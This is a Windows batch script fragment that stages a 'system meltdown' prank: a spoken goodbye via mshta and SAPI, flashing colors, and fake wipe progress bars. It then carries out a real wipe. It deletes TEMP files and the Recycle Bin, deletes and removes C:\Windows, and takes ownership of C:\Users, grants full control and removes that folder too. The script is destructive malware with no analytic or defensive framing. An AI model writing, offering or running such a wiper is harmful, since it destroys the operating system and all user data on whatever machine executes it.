:: TEXT-TO-SPEECH CHAOS
mshta vbscript:Execute("CreateObject(""SAPI.SpVoice"").Speak ""You have triggered system destruction. This cannot be undone. Goodbye.""(window.close)")

:: CHAOTIC BACKGROUND + SOUND LOOP
setlocal enabledelayedexpansion
for /l %%a in (1,1,60) do (
    set /a "rand=!random! %% 15"
    set /a "rand2=!random! %% 15"
    color !rand!!rand2!
    echo !!! SYSTEM MELTDOWN IN PROGRESS !!!
    echo SYSTEM BREACH DETECTED... OVERLOAD %random%%random%%random%
    echo ERROR CODE: 0x%random%%random%
    echo .
    timeout /t 0 >nul
    echo ^G
)
endlocal

echo Initializing TOTAL DESTRUCTION...
timeout /t 2 /nobreak >nul
echo Scanning for system partitions...
timeout /t 2 >nul
echo C:\ ... found.
echo SYSTEM32 ... found.
echo USER DATA ... found.
timeout /t 1 >nul
echo Preparing total system wipe...
timeout /t 3 >nul

cls
echo Wiping system partitions...
timeout /t 1 >nul
echo [########                  ] 33%%
timeout /t 1 >nul
echo [###################       ] 78%%
timeout /t 1 >nul
echo [##########################] 100%%
timeout /t 2 >nul

echo.
echo Deleting TEMP files...
del /f /s /q "%TEMP%\*.*" >nul 2>&1

echo Clearing Recycle Bin...
rd /s /q C:\$Recycle.Bin >nul 2>&1

echo Deleting system files...
del /f /s /q C:\Windows\*.* >nul 2>&1
rd /s /q C:\Windows >nul 2>&1

echo Deleting all user data...
takeown /f C:\Users /r /d y >nul 2>&1
icacls C:\Users /grant administrators:F /t >nul 2>&1
rd /s /q C:\Users >nul 2>&1

echo All user and system data purged.
